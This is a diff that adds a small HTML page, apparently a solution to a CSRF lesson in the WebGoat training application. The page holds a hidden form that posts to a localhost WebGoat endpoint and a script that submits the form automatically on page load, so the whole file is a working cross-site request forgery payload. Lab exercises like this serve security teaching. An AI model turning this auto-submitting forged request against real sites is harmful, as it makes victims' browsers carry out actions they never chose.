@@ -1,0 +1,10 @@
+<html>
+    <body>
+        <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
+            <input type="hidden" name="csrf" value="false" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
